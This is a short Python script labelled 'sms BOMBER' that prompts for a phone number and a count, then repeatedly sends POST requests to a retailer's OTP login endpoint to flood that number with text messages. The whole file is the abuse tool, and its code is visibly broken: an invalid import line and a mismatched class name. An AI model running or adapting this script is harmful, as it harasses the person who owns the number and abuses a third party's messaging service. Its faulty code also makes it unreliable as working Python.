nmbr=input(''number: '')
x=int(input(''msg count: ''))

import os
os.system(''clear'')
os.system(''figlet sms BOMBER'')
import requests
import requests.structures import caseInsensitiveDict

url = ''https://www.decathlon.in/api/login/sendotp''

headers = CaseInsensitiveDict()
headers[''content-Type''] = ''application/x-www-form-urlencoded''

data = ''param=''+nmbr+''&source=1''

for i in range(x):
	
	   resp = requests.post(url, headers=headers, data=data)
	   
print(resp.status_code)


 


